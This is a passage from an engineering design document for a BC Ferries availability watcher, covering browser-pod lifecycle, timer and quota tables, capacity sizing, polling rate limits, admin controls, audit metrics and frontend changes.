starts are measured in S-MEM instead), the anchor ConfigMap and the PDBs.

---
## 8. Lifecycle and reaping

### 8.1 State machine

```
 Trip modes and phases (shown to users; owned by the fleet loop except where noted)

   Off <-------- disabled / paused (user, after_checkout until answered, suspended, maintenance)
    |  enable / resume / "No, keep watching"   (never refused for maxActiveBrowsers)
    v
 ShortChecks "Checked every 6 h · next 2:05 pm" <----------------------------------------+
    |  due (6 h, or now when added/resumed): short-check pod, checks once                  |
    |    --no opening, or opening but no claim--> exit ------------------------------------+
    |    --opening + claim granted--> Holding (below; the pod exits after the hold)
    |
    |  becomes the user's nearest trip within 7 days (polling.py warm_trip)
    v
 Queued(position) "Waiting for a free browser (#2)" --slot + start throttle--> Starting
                                                                                  |
 BackingOff(until) <--3 pod failures/30 min-- Starting --first check--> Watching "Every 2 minutes"
    |  timer                                    | 15 min timeout          |   ^    | a nearer trip takes the warm
    +--> ShortChecks / Queued                   v                         |   |    | browser (only while Watching)
                                             Failed -> recycle            |   |    +--> drain --> ShortChecks
                                                                          |   | unviewed hold ended, or cart
                                                                          v   | expired on the site (warm pod)
                                                       Holding.Unclaimed --viewer--> Holding.InCheckout
                                                       (egress label = hold)  |               |
 NeedsAttention <-- RouteRejected x3 / 5 startup failures                     +-- hold ends --+
                                                                              v
                                                         Draining (empty + verify unless paying, bye, exit 0)
                                                                              |
                                  viewed? --yes, BC Ferries confirmation seen--> archived, "Booked!"
                                          --yes, no confirmation--> Off(after_checkout) "Did you book it?"
                                                                    (stays paused until answered: Yes archives,
                                                                     No resumes; no automatic resume)
 Past (last in-window departure passed, Pacific) -> archived after 7 d
```

**Pod phases** (`browser_pods`, `trip_runtime`): Creating → Starting → Watching → Holding → Draining → Gone,
plus Failed. A short-check pod goes Creating → Starting → one check → Gone, or on to Holding → Draining →
Gone if it carted. At most one pod per trip exists at a time. Every start is a new pod `fw-<trip>-g<n+1>`, so
nothing a viewer did persists (`restartPolicy: Never`; emptyDirs die with the pod
[R:limits-reaping-lifecycle "A fresh browser requires a new pod"]).

The draft's 14-day inactivity pause is removed. It stopped exactly the users who use the product as intended
(add a trip and wait for an alert), and decision 9 is already met: a watching pod without VNC cannot be used
for anything else, and capacity is handled by the per-user limit and the queue.

### 8.2 Every timer and limit (canonical table)

This is the only place numbers are defined; other sections refer here. "Compiled" values are in agent code
(§5.4) and cannot be configured.

| Item | Default | Ceiling / bound | Enforced by |
|---|---|---|---|
| **Per user** (effective = `min(override ?? default, ceiling)`, §9.1) | | | |
| `maxTrips`: "watched routes per user", stored, not past or archived (replaces `MAX_TRIPS=6`, `models.py:16`, `store.py:89-91`) | 3 | 10 | web (transaction) |
| `maxActiveBrowsers`: warm browsers at once (the user's nearest eligible trips within 7 days; owner decision during review, automatic selection from round 3) | 1 | 3 | fleet loop (never refuses an enable) |
| holds at once, per user (owner, round 3) | 1 | 1 | control (`cart_claim`, C32) |
| `maxHoldsPerDay` (Pacific) | 4 | 10 | control (`auto_cart`, `cart_claim`) |
| `maxCartAttemptsPerDay` | 6 | 12 | control; agent ≤ 6 per pod |
| `vncMinutesPerDay`: checked before carting (no cart when minutes left < `session_s`); never closes an open session | 60 | 120 | control (`auto_cart`), web (mint) |
| VNC ticket mints | 10/min | — | web |
| manual checks (ignored if a check ran < 15 s ago) | 6/h | 20/h | web, agent |
| test alerts | 6/h | 6/h | web |
| **Polling** (owner, round 3; fleet-wide; canonical definition `PollPolicy` in `src/ferry_watch/polling.py:33-86`, rendered from values `polling.*`) | | | |
| `tripHorizonDays`: latest allowed date (`horizon`, `:41`; `within_horizon`, `:84-86`) | 30 days | owner's rule; changed only by a values PR | web (transaction) |
| warm window: a trip this close gets the user's warm browser (`warm_window` = the slowest tier's reach, `:62-65`; `warm_trip`, `:98-105`) | 7 days | — | fleet loop |
| warm poll curve by time to the trip's first departure (`tiers`, `:34-39`; `interval`, `:67-75`) | 7 d-3 d: 5 min; 3 d-24 h: 2 min; 24 h-6 h: 60 s; under 6 h: 30 s; ±15 % jitter in the agent | tiers admin-tunable by values; `PollPolicy` refuses unordered tiers, a faster tier further out, or any interval under the floor | control (computes), agent (jitter, bucket) |
| interval floor (`MIN_INTERVAL`, `:21`) | 30 s | compiled, in `polling.py` and in the agent (§5.4) | control, agent |
| short check: every other eligible trip, one check by a short-lived pod (`short_check_interval`, `:40`) | every 6 h, ±15 % jitter; at once when a trip is added, re-enabled or un-paused | admin-configurable up to 24 h; never more often than the slowest warm tier | fleet loop |
| `shortCheckSlots`: browser slots kept free of warm pods | 1 | < `maxBrowsersTotal` | fleet loop |
| quiet hours (`QuietHours` in `polling.py`, from `user_settings`): the user's trips aren't checked at all, no pods start, pods not holding a cart are drained; lifted for a trip for 10 minutes by a manual check (`quiet_lifted_until`) or "Hold it for me" (`hold_requested_until`) | none (each user sets their own, Pacific; until 0.6.3 a fleet-wide 23:00-06:00 that only stopped carts) | per user; the deprecated `polling.quietStart`/`quietEnd` are ignored | control (planner, `active`, `auto_cart`, `cart_claim`), web |
| **Hold clocks** | | | |
| unclaimed, from control ack (reminder at 15 min) | 30 min; tuned from production (kept ≤ BC Ferries' cart TTL − 5 min once `ferrywatch_site_cart_ttl_seconds` shows it) | compiled 45 | agent; operator backstop |
| checkout session, from first connect (warning at T−5) | 30 min; tuned from production (`ferrywatch_checkout_seconds` p90 + 5 min) | compiled 45 | agent gate |
| viewer gone, then release | 10 min | compiled 15 | agent |
| payment guard: session and viewer-gone paused while a frame is on a host other than bcferries.com or Queue-it, or payment was submitted | on | hard cap still applies | agent |
| hold egress: the pod's `ferry-watch.io/egress` label is `hold` from READY to hold end (§7.6); retried every 5 s; a pod that can't be set back within 60 s is deleted | on (`holdEgress.enabled`) | — | control, Cilium, VAP |
| cart claim: the agent starts carting within / the claim lapses without `cart_held` or `cart_failed` after | 30 s / 2 min | compiled / — | agent / control |
| hard hold cap, from READY (replaces `BCF_CART_HOLD_MINUTES=60`/0, `settings.py:30`) | 60 min | compiled 90 | agent; operator at +5 min; Xvnc `-MaxConnectionTime 6000` |
| cart liveness check while unclaimed (reads the cart page; never presses the site's "continue") | every 4 min; values flag to turn it off | — | agent |
| "Did you book it?" after a viewed hold with no detected confirmation, unless it was released on request | the trip stays paused until answered ("Yes" and "No, cancel" archive, "No" resumes); no automatic resume (owner, round 3) | — | control, web |
| `guest_checkout_failing` admin alert | the first forced login wall or `needed_account` answer; the PrometheusRule `GuestCheckoutFailing` at 2 or more viewed holds within 7 days ending with a forced login wall or a `needed_account` / `checkout_broke` answer. Voluntary visits and `tried_sign_in` never count. | — | control, PrometheusRule |
| **Cluster** (§8.4) | | | |
| `browserMemoryBudget` | 12 GiB (owner range 8-24 GiB) | — | sizing `maxBrowsersTotal` (§8.4); not a value |
| `podMemory` (request = limit) | 1.5 GiB → `ceil(p95 working set incl. tmpfs × 1.2)` after S-MEM | LimitRange = `podMemory` | VAP, quota |
| `cpuRequest` | 200m | limit 1500m | VAP, quota |
| `maxBrowsersTotal` | `floor(budget / podMemory) − 1` = 7 | quota pods = cap + 1 | fleet loop, quota |
| concurrent starts / starts per hour / per-user spacing (warm and short-check pods alike) | 2 / 30 / 20 s | — | fleet loop |
| `checksPerMinute` (budget; owner, round 3) | 20 | 40 | control |
| **Pod** | | | |
| heartbeat (`state`) / UI stale | ≤ 15 s / 60 s | — | agent / web |
| Watching dead after silence | 5 min (only when the hub endpoint has been up ≥ 2 min) | — | fleet loop |
| Holding dead after silence | never; only the operator's clock or kubelet | — | fleet loop |
| startup timeout (create → first check; `CHECK_TIMEOUT_SECONDS`, `watcher.py:48`); for a short-check pod, its whole run unless it carts | 15 min | — | fleet loop |
| Pending / unschedulable | 5 min → delete, Queued, admin alert | — | fleet loop |
| max age (only Watching and idle) | about 24 h −10 % | — | agent (`FW_DEADLINE_AT`) |
| `activeDeadlineSeconds` | 93600 (26 h) | VAP ≤ 93600 | kubelet, quota |
| no new cart within … of the deadline | 100 min | compiled | agent |
| no new cart without a `cart_claim` granted within (it also proves ferry-control is reachable) | 30 s | compiled | agent |
| terminationGracePeriod / drain budget / Queue-it wait during drain (`site.py:52` is 10 min) | 90 s / 60 s / 45 s | VAP pins 90 | agent |
| context reset / pod recycle (consecutive failures; `watcher.py:52`) | 3 / 6 | — | agent / fleet loop |
| BackingOff after 3 pod failures in 30 min | 5, 10, 20, 40, 60 min; reset after 1 h healthy | — | fleet loop |
| RouteRejected ×3, or 5 startup failures | NeedsAttention | — | fleet loop |
| orphan sweep | 60 s (after 2 min grace) | — | fleet loop |
| failed-pod retention (never held, never viewed) | 30 min | — | fleet loop |
| Xvnc `-MaxConnectionTime` (backstop; exits Xvnc) | 6000 s | > compiled hold | Xvnc |
| gate WebSocket ping / missed pong | 20 s / drop the viewer | — | gate |
| client reconnect | stock client every 1 s; shim reload back-off 1, 2, 5, 10 s until the hold deadline | — | vnc-edge client |
| failed VNC upgrades | 5/min | — | gate |
| VNC ticket TTL / reuse | 60 s / single use, then the first-viewer lock | — | gate |
| projected token | 600 s, checked at connect | — | kubelet / control |
| fail-slow interval (no operator for 10 min) | `max(interval, 300 s)` | — | agent |
| **Web** | | | |
| dashboard WebSocket lifetime / first-message auth deadline | 60 min / 5 s | — | web |
| app session (bearer token) | 7 d idle / 30 d absolute; revoked on logout, "sign out everywhere", suspension | — | web |
| IdP re-verification of a session (silent redirect; re-checks the client policy and groups; rotates the token) | every 24 h | 1-24 h (`identity.reverifyHours`) | web, Authelia |
| pre-auth limits on `/auth/*` and unauthenticated sockets | per client (`CF-Connecting-IP`), plus a global ceiling | — | web |
| re-sign-in when the app session lapses | silent redirect while the Authelia session lives: 3 d idle / 7 d, or 6 months with remember-me (cluster-wide) | — | Authelia |
| OIDC consent remembered | 1 year (`pre_configured_consent_duration`) | — | Authelia |
| invitation validity | 30 d | — | web |
| **Retention** | events 30 d; outbox 14 d; pod history 30 d; audit, usage and hold outcomes 400 d; sessions and invites 30 d after expiry, revocation or use; unmatched identities 30 d after last seen; archived trips deleted 90 d after the sailing; delete-my-data immediate | | db jobs (control) |

### 8.3 Disruptions, upgrades and restarts

- **Planned drains (Talos upgrades).** §7.8: Watching pods are moved; holds on the drained node are released
  in order with an alert. The runbook pauses carting before merging a Talos bump. Kubernetes upgrades through
  tuppr do not drain nodes.
- **Involuntary loss** (node crash, OOM, node-pressure eviction): the cart is lost and a `cart_lost` alert is
  sent. The departure is re-carted only if no viewer had connected (C22). Memory request = limit, the
  descheduler exclusion and `preemptionPolicy: Never` make pressure eviction unlikely; S-MEM sizing makes OOM
  unlikely; an alert fires when a holding pod's working set passes 85 % of its limit.
- **Control-plane restarts never lose carts:**
  - Pods are bare and owned by nothing; their readiness is local.
  - The fleet loop adopts pods by label plus `browser_pods`, and waits 2 min before judging silence.
  - Agents keep carts, clocks and the gate locally, and replay up to 200 unacked events.
  - The outbox is written before sending. Alerts are delayed, never lost.
  - A web restart costs 10-20 s of dashboard downtime; a control restart means agents reconnect and replay.
- **Image rolls:** the control image rolls freely. A new browser digest applies only to new pods. Existing pods
  change only at natural recycles (max age, after a hold, failure), never during a hold. `allowedImages` and
  ferry-control's config change in the same release; admission checks only new pods.
- **Ticket key rotation:**
  1. Add the new public key next to the old one (pods created from then on carry both).
  2. After 26 h, switch web to the new private key (as built, one 1Password edit: the key carries its id).
  3. After another 26 h, drop the old public key.
- **DB:** CNPG failover makes both control processes reconnect with back-off. Agents are unaffected.

### 8.4 Capacity

Under the round-3 poll model a user needs a long-lived browser only while one of their trips is within 7 days
(the warm browser, one per user by default). Trips further out, and a user's other trips, cost only a
short-check pod for a few minutes every 6 hours. So the number of warm browsers is the number of people with
a sailing in the next 7 days at once; everyone else shares the short-check slot.

`maxBrowsersTotal = floor(browserMemoryBudget / podMemory) − 1`, and the quota is `(maxBrowsersTotal + 1) ×
podMemory ≤ browserMemoryBudget` (one terminating predecessor of headroom; a trip's successor pod is created
only after its predecessor is gone). `shortCheckSlots` (1) of those are kept free of warm pods, so warm
browsers at once = `maxBrowsersTotal − 1`.

| Budget | podMemory 1.0 GiB | 1.25 GiB | 1.5 GiB (start) |
|---|---|---|---|
| 8 GiB | 7 (6 warm) | 5 (4 warm) | 4 (3 warm) |
| 12 GiB (start) | 11 (10 warm) | 8 (7 warm) | 7 (6 warm) |
| 16 GiB | 15 (14 warm) | 11 (10 warm) | 9 (8 warm) |
| 24 GiB | 23 (22 warm) | 18 (17 warm) | 15 (14 warm) |

- **Short checks fit easily in one slot.** A short check is a pod start, a form walk (perhaps through
  Queue-it) and one check: a few minutes (S-MEM measures pod-ready time). A user with 3 trips and none within
  7 days needs at most 3 × 4 = 12 short checks a day; one slot at about 3 minutes each runs about 480 a day,
  enough for about 40 such users, and any free warm slot also takes them. The start throttle (30 starts an
  hour, 720 a day) is the tighter bound at about 60 such users.
- A short-check pod that carts keeps its slot for the hold (at most the 60-minute hard cap); due short checks
  then use any other free slot or wait.
- `podMemory` must cover the processes **and** the memory-backed `/tmp` and `/dev/shm`, because Kubernetes
  charges tmpfs pages to the container's memory cgroup. The research measured 0.52-0.57 GB of process memory
  per pod on light pages [R:map-k8s-research §g]; real BC Ferries pages, the in-memory profile and cache
  (capped at 32 MiB) and `/dev/shm` add to that. S-MEM measures the cgroup working set
  (`container_memory_working_set_bytes`, `memory.peak`) while watching (W0) and during the owner's real
  checkouts with a viewer (M1).
  The start value of 1.5 GiB is deliberately conservative; it drops to the measured value after S-MEM.
- If the owner's "8-24 GB" meant decimal gigabytes, use 7.45-22.35 GiB in the formula (one or two fewer
  browsers per row). decisions.md's "roughly 7-23 users" is the 1.0 GiB total column; with the short-check
  slot kept free it is 6-22 warm browsers, and many more users in total, because only users with a sailing
  within 7 days hold one.
- The other components need about 1 GiB together (web, control, two vnc-edge replicas), outside the browser
  budget.

---

## 9. Admin controls and quotas

### 9.1 Model

`effective(user, key) = min(user_override ?? default, gitops_ceiling)`. Defaults and ceilings are chart values
(GitOps); per-user overrides are set on the Users page with a mandatory reason. The UI shows each value with
its source (default, override or ceiling). Values are in §8.2.

**Effect of a limit change:** stored trips are kept; running resources follow at once (excess pods drain,
most-recently-started first); a held cart gets `min(old deadline, now + new cap)` and is never silently
destroyed [R:limits-quotas-admin].

### 9.2 Enforcement layers (each catches the others' failure mode)

1. **ferry-web, transactional.** `SELECT … FOR UPDATE` on the user row, then count and insert. It returns 409
   `{field, limit, usage}`. Covers saved trips, the 30-day horizon, manual checks, test alerts and mints.
2. **ferry-control fleet loop, continuous.** Warm-trip selection (`maxActiveBrowsers`), the short-check
   schedule, caps, the queue, start throttling, the hold backstop clock, the hold-egress label and the reaper.
3. **ferry-control hub endpoint.** Cart claims (one hold per user), holds per day, cart attempts per day, VNC
   minutes, quiet hours, the poll curve and the budget.
4. **The agent.** Compiled maxima (§5.4) and local timers. Works with the control plane down.
5. **Kubernetes backstop, GitOps-owned.** ResourceQuota, `NotTerminating pods: 0`, LimitRange, PriorityClass
   and the VAP (§7.5-7.7).

### 9.3 Queueing and fairness

- **Memory slots.** No Pending pods and no preemption. Warm starts queue by fewest running browsers, then
  nearest sailing, then oldest queued; short checks run oldest-due first in the `shortCheckSlots` slot and in
  any other free slot (§6.6).
- **Poll curve (owner, round 3: "the longer away it is the less frequent we poll, but closer it is more
  frequent. We want to be good users of the api").** Each warm pod's interval comes from the time until its
  trip's first departure: 7 days to 3 days out every 5 min, 3 days to 24 h every 2 min, 24 h to 6 h every
  60 s, under 6 h every 30 s (`PollPolicy`, `src/ferry_watch/polling.py:33-43`; ±15 % jitter in the agent; a
  30 s floor compiled into both). Every other trip within the 30-day horizon gets one short check every 6 h.
  A user's own quiet hours (none by default) stop all of their checks, which lowers the load at night
  (until 0.6.3, fleet-wide quiet hours kept this polling and only stopped new carts).
- **Request rate.** A warm pod makes 0.2, 0.5, 1 or 2 checks a minute depending on its tier; a short check is
  one check plus a pod start's form walk (about 4-5 navigations [R:limits-reaping-lifecycle]) every 6 h.
  - **Worst case:** 7 users all within 6 h of a sailing at once: 7 × 2 = **about 14 checks/min**, under the
    20/min budget, so nothing is stretched. Short checks add well under 1 check/min for the whole fleet (even
    40 users × 3 trips × 4 a day is about 0.3/min) plus their pod starts, which the start throttle caps.
  - **Typically 2-5 checks/min:** warm trips spread across the tiers (for example two within 24 h at 60 s,
    three at 2 min and two at 5 min is 2 + 1.5 + 0.4 ≈ 4/min).
  - For comparison, the owner today runs up to 6 trips at 30 s each, about 12 refreshes/min, all the time.
- **BC Ferries budget (D12; owner, round 3: 20 checks/min, ceiling 40).** ferry-control stretches every warm
  interval proportionally only when the curve asks for more than the budget:

  ```
  demand   = Σ over Starting/Watching warm pods of 60 / curve_interval   # checks/min the curve asks for
  stretch  = max(1, demand / checksPerMinute)                            # checksPerMinute default 20, ceiling 40
  interval = min(3600, max(30, curve_interval × stretch) × brake.multiplier)
  ```

  - Stretching starts only beyond 10 pods all in the 30 s tier (or more pods in slower tiers), which needs a
    larger memory budget than the starting one; at 22 warm pods all under 6 h (24 GiB of 1.0 GiB pods) it
    gives 66 s. If an opening stays bookable for T seconds and checks are I seconds apart, the chance of
    seeing it is about min(1, T/I).
  - New intervals are pushed in `configure` only when they change by more than 10 % or the trip crosses a
    tier. The agent keeps ±15 % jitter and a token bucket (burst 2). The dashboard shows "every 2 min" and,
    when stretched, "every 2 min · 2 min 30 s now".
  - Pod starts (warm and short-check) are throttled separately: 2 concurrent, 30 an hour.
  - Cart flows (claim, add-to-cart, liveness, empty, drain) bypass the bucket and are capped per day.
  - The agent reports `opening_seen` and `opening_gone` events, which give
    `ferrywatch_opening_visible_seconds`; a cheap version of that metric is added to the current deployment in
    W0, so the curve's tiers can be tuned from real data.
- **User agent:** the desktop user agent stays (`site.py:45-47`; owner, round 3).
- **Brake** (persisted in `fleet_state`): Queue-it detours on 2 or more pods within 10 min, or any 403/429,
  doubles `multiplier`, up to ×8. A `Blocked` page sets `paused=true` (checks stop; holds continue) and alerts
  the admin. The brake decays one step every 30 min. A restart can't reset it.
- **Breaker** (persisted, simplified for v1): it opens when `MarkupChanged` comes from at least 50 % of 3 or
  more Watching trips, covering at least 3 distinct search keys, within 10 min. While open, checks pause
  (holds continue), the fleet loop freezes starts, recycles and back-off, per-trip "failing" alerts become one
  dashboard banner, and the admin is alerted once. The admin closes it from the Fleet page (a markup change
  usually needs a new browser image anyway). Automatic canaries are M4.
- **Fail-slow:** an agent with no operator contact for 10 min uses `max(interval, 300 s)`. Neither an outage
  nor a compromised control plane can make an honest agent poll faster than the compiled 30 s. A pod running
  attacker code is not bound by this (R13).
- **No cross-tenant search dedupe.** One pod's results would drive another tenant's alerts and carts, which is
  an integrity channel for A3.
- **M4, only if data warrants it:** weighted max-min water-filling with AIMD leases. (The short checks are the
  cold tier the draft deferred, and the curve is the near-sailing priority, so neither is backlog any more.)
- **Powell River–Comox:** BC Ferries' waitlist auto-books on this route
  [R:billing-paid-service-implications], so openings may never be public. The dashboard shows users of that
  route a note suggesting they also join the waitlist.

### 9.4 Admin UI and API (v1)

All admin routes require `is_admin` (or `bootstrapAdmins`). Every mutation requires `reason` and writes
`audit_log` plus a JSON audit log line from ferry-web, so VictoriaLogs keeps a copy the DB can't rewrite.
**Admins never get VNC, exec or screenshots** of tenant browsers (owner, round 3), and see no tenant sailings
beyond the cart summary.

| Page | Shows | Actions |
|---|---|---|
| Fleet (admin home) | capacity (memory used/budget, warm and short-check browsers by phase, queued, short checks due and overdue), budget (checks/min against the curve's demand, stretch, brake, breaker), holds now (user, route, countdown), hold outcomes this week and over time from `hold_outcomes` (booked, released, expired, login wall seen and whether forced, "Did you book it?" reasons, releases by check level; by fare and vehicle type), attention list (NeedsAttention, image skew, delivery failures, `release_unverified`, `checkout_blocked`, hold-egress flips failing, `guest_checkout_failing`), the versions running (ferry-web, ferry-control as of its last pass, browser pods by agent version and image, and the dashboard's own build) | maintenance on/off (labelled "Pause everything": no browsers run), **pause carting** (for Talos upgrades, and the immediate alert-only switch if guest checkout fails, §5.7), close the breaker, release a cart, recycle a pod |
| Users | state, open invitations, effective limits with provenance, usage today, last seen, push/email status, active sessions, unmatched sign-ins (last 30 days), sign-ins whose email changed | add person (creates an invitation and sends `invited`), suspend (revokes sessions, drains pods; holds released or allowed to finish, by choice), revoke sessions, set overrides, make admin (bootstrap admins are locked), delete user |

**API:** `GET /api/admin/overview`; `GET/POST/PATCH/DELETE /api/admin/users[/{id}]`;
`GET/POST/DELETE /api/admin/invites[/{id}]`; `GET /api/admin/unmatched`;
`POST /api/admin/users/{id}/revoke-sessions`; `POST /api/admin/trips/{id}/{release|recycle}`;
`POST /api/admin/fleet/{maintenance|pause-carting|breaker}`.

The draft's Trips, Settings and Audit pages, the DB `policy` table and the request-access queue are deferred
to M4 (§12.2). Until then audit is read with `psql` or from VictoriaLogs, and defaults change through a values
PR.

*As built* (`src/ferry_watch/web/admin.py`, `web/src/mt/AdminPage.tsx`, migration `0002_admin.sql`):
- **Release** applies only to a READY cart that isn't being paid for (409 otherwise): the agent ignores a release
  while a cart is still being added, and emptying a cart mid-payment would cost the person their booking.
  Suspending with "release their held cart now" skips a cart being paid for (recorded in the audit entry) and
  recycles a pod that is still adding, so the cart is emptied once it lands.
- **Recycle** queues an `agent_commands` row with op `recycle`, which the hub sends as `drain{reason: recycle}`.
  A recycle queued before the current pod existed was for an earlier generation and is dropped.
- **Close the breaker**: ferry-web may write only `"closed"` to `breaker` (row-level security); only
  ferry-control opens it.
- **Delete** needs the person suspended and their browsers stopped (a running agent's next report would
  otherwise hit a missing trip). It erases their account, trips, sessions, devices, notifications and events;
  the audit log, hold outcomes and usage ledger stay. It isn't a ban: if an invitation, auto-approve group or
  bootstrap entry still matches them, they can sign in again as a new person, so remove them from the sign-in
  group first (§12.5).
- **Make admin** can't change your own admin, nor demote a bootstrap admin (the config makes them admin).
- The Fleet page reads `fleet_report`, which the fleet loop writes after every pass (browsers live of max,
  memory, queue, short checks due and overdue, checks per minute against demand, stretch, brake, breaker, and
  ferry-control's version), and an attention list (trips needing attention, undelivered alerts,
  `release_unverified`, `checkout_blocked`). The overview's `versions` carries ferry-web's version,
  ferry-control's from `fleet_report` (null before its first pass), and the live pods grouped by
  `browser_pods.agent_version` and `image_digest`.

### 9.5 Audit and ops signals

- **Audited:** every admin mutation; user trip create, edit and delete; every VNC mint; and system actions as
  `system:control` (start, recycle, reap with reason, queue, brake/breaker transitions, binding violations).
- **Metrics** (no user, trip or pod labels; Prometheus is capped at 2 GiB):
  - `ferrywatch_browsers{phase,mode}`, `ferrywatch_queue_depth`, `ferrywatch_short_checks_total{result}`
    (no_opening, carted, alerted, failed), `ferrywatch_short_checks_overdue`,
    `ferrywatch_memory_{requested,budget}_bytes`;
  - `ferrywatch_bcf_navigations_total{kind}`, `ferrywatch_checks_demand_per_minute`,
    `ferrywatch_interval_stretch`, `ferrywatch_queueit_detours_total`, `ferrywatch_brake_multiplier`,
    `ferrywatch_breaker_state`;
  - `ferrywatch_holds{state}`, `ferrywatch_holds_total{outcome}` (the `bye` outcomes plus the "Did you book it?"
    answer and reason), `ferrywatch_checkout_host_blocked_total`, `ferrywatch_hold_egress_flips_total{to,result}`,
    `ferrywatch_cart_claims_total{result}`,
    `ferrywatch_checkout_login_seen_total{forced}`, `ferrywatch_releases_total{check}` (cart_empty, landing_url,
    none);
  - `ferrywatch_alerts_total{channel,result}`, `ferrywatch_reaper_actions_total{reason}`,
    `ferrywatch_vap_denials_total`, `ferrywatch_signins_total{result}` (ok, reverified, denied, not_invited,
    uid_mismatch, error);
  - histograms for check seconds, pod-ready seconds, agent working set, `ferrywatch_opening_visible_seconds`,
    `ferrywatch_checkout_seconds` (first viewer to hold end; tunes the session clock in place of S2b) and
    `ferrywatch_site_cart_ttl_seconds` (READY to `cart_expired_by_site`; tunes the unclaimed clock in place
    of S6).
- **PrometheusRules** go to the owner's Alertmanager: BreakerOpen, Blocked, PodsPending (> 5 m),
  PodCreateDenied (VAP or quota), AgentsSilent (> 50 % for 5 m), WebDown/ControlDown, HoldsLost (≥ 2 in 1 h),
  HoldingPodMemoryHigh (> 85 %), CheckoutHostBlocked, HoldEgressFlipFailing,
  ShortChecksOverdue (> 2 h), AlertDeliveryFailing (> 10 % for 15 m), QuotaBackstop
  (≥ 95 %), ReleaseUnverified, GuestCheckoutFailing (§8.2), SignInErrors (the issuer unreachable or tokens
  failing verification for 10 m).
- **Post-mortem for a failed pod:** browser logs are excluded from Fluent Bit (C26), so the owner's tools are:
  the enum termination message; the 30-minute retention of failed pods that never held or viewed (cluster
  admin `kubectl logs`, out-of-band); masked error classes in `trip_state`; and a documented local
  reproduction (the `agent-e2e` image against the live site from a workstation, §11.6). A GrafanaDashboard
  ships in home-cluster.

---
## 10. Frontend changes (`web/`)

The size is L: about 2-2.5k changed or added lines, including tests [R:map-frontend]. M1 ships items 1-5 and
7-9; Web Push (item 6) and the admin pages (item 10) ship in M2.

1. **Ship first, before any server change:** `.catch('unknown')` on the strict zod enums
   (`web/src/lib/schema.ts:58`, `:66`, `:94`) and on the new browser phases. Otherwise one new server value
   breaks the whole dashboard (`api.ts:125-131`).
2. **Schema** (`schema.ts:100-115`):
   - Add `me{id, name, email, is_admin, push_enabled}` (`paused` stays a release, always false),
     `settings{quiet_hours}`, `quiet_hours{start, end, now}`, per-trip `quiet`,
     `limits{value, source}`, `usage`, `capacity{can_add, reason}`, `links{kofi}`, and per-trip
     `browser{phase, mode, reason, queue_position, next_check_at, last_check_at, effective_interval, next_due,
     heartbeat_at, lockdown_ok}`.
   - `cart` gains `unclaimed_deadline`, `session_deadline`, `hard_deadline`, `payment_in_progress` and
     `viewer{connected}`.
   - Remove the global `checkout_url`, `login_configured`, `alerts_configured` and `max_trips`.
3. **Routes:** path routes `/` (my trips), `/c/:trip` (checkout chooser), `/settings` and `/admin`, with a
   small router. The server serves `index.html` on those exact paths.
4. **Sign-in (OIDC, §6.2.2):** a small signed-out screen with one "Sign in" button (Authelia's page does the
   rest), shown when there is no token and after an explicit sign-out (a "signed out" flag in localStorage stops
   any automatic sign-in until the button is pressed); the `/auth/callback` route (check `state`, clear the
   fragment, POST `/auth/session`, store the token in localStorage, return to the saved path);
   `Authorization: Bearer` on every fetch (`api.ts`); the dashboard WebSocket's first `auth` message; a 401
   with reason `expired` or `reverify` starts sign-in again automatically, keeping the current path, so a cart
   alert still lands on `/c/<trip>`, while `revoked` shows the signed-out screen; a 403 for a non-active user
   shows "Your access is being set up" or "Your account is suspended". The token never goes in a URL or the
   service worker. The manifest needs no `crossorigin` change, because nothing sits behind gateway auth any
   more.
5. **Components:**
   - Replace `WatcherCard` (`WatcherCard.tsx:159-238`) with an **Account card**: push subscribe and status,
     a test alert, the user's own quiet hours (0.6.3; "pause all my trips" is gone, each trip has its own
     pause), how checking works (the curve and short checks; read-only, round 3), "Signed in
     through Authelia; tick Remember me", my sessions with "Sign out everywhere", delete my data, and the
     Ko-fi link.
   - Per trip: a "next check" chip and a badge with plain wording: "Every 2 minutes" (warm),
     "Checked every 6 h · next 2:05 pm" (short checks), "Checking now", "Waiting for a free browser (#2)",
     "Starting", "Holding a cart", "Did you book it?" (paused until answered), "Needs attention". The trip
     form says which trip will get close watching and when ("closely watched from Jul 25, 7 days before").
     Each card has Edit and Remove (0.6.4). Remove asks first, as the trip form's does, and with a cart held
     or being added it says that removing lets that sailing go.
   - `/c/:trip`: the held sailing, the deadlines, and **Check out on this device** / **I'll use my computer**
     / **Release and book it myself**, with "Checkout will be locked to the device you choose" and "Check
     out as a guest. Don't sign in to BC Ferries here: it doesn't accept a sign-in while a cart is held"
     (§5.7). No automatic POST.
   - `CartBanner` (`CartBanner.tsx:44`, `:112-113`, `:136-140`): per-trip "Open checkout" (goes to `/c`),
     the unclaimed and session countdowns, "paused while paying", the guest wording (including the
     don't-sign-in advice), and "Release".
   - "Did you book it?" ("Yes", "No, cancel", or a "No" that offers the optional one-tap reasons of §5.7; the question stays on the trip
     card until answered, because the trip is paused until then) and "Booked!" screens; the latter carries
     the Ko-fi link.
   - `TripSheet` (`TripSheet.tsx:317`, `:470-500`): auto-cart is always available (guest). Remove the
     `BCF_USER` copy. Show 409 limit errors (saved trips, the 30-day horizon); the date picker stops at 30
     days.
   - `Header` (`Header.tsx:59-86`): the global "Watch all trips" switch becomes a user menu (settings,
     sign out, admin; trips are paused one at a time; sign-out ends the app session, sets the "signed out" flag and offers a link
     to Authelia's logout page).
   - The "watcher stalled" banner (`App.tsx:34-36`, `Banners.tsx:119-125`) becomes per trip, with a separate
     admin-only control-plane health banner.
   - A Powell River–Comox note pointing to BC Ferries' waitlist.
6. **Service worker** (new, `web/public/sw.js`, M2): Web Push display, and `notificationclick` building the URL
   from `data.trip` against `self.location.origin + '/c/'`. CSP is unchanged (`worker-src` falls back to
   `script-src 'self'`).
7. **Onboarding page** (`/settings#start`, linked from the `invited` email): add to Home Screen, enable
   notifications from inside the app, allow Ferry Watch in Focus/Sleep, send a test alert; it works only
   from Canada and the US (the Cloudflare geo-block, round 3).
8. **Errors:** Envoy replaces 502-504 bodies with HTML [R:cluster-networking], so 5xx bodies are never parsed
   as JSON.
9. **Tests:** update the fixtures every suite uses; rewrite the `WatcherCard` and `watcher.ts` tests; add tests
   for the router, the `/c` chooser, the Account card, the sign-in start and callback (`state` mismatch,
   missing verifier, return path), bearer headers, the WebSocket `auth` message, 401 handling by reason, and
   no automatic sign-in after an explicit sign-out.
10. **Admin pages** (M2): Fleet and Users (§9.4), with their own zod schemas and tests.

---

## 11. Packaging, CI and testing

### 11.1 Python layout

One uv workspace with one `uv.lock`:
- **`packages/ferry-watch-core`:** `models` (from `models.py`), `bcferries/urls.py` (`BASE_URL`, `USER_AGENT`,
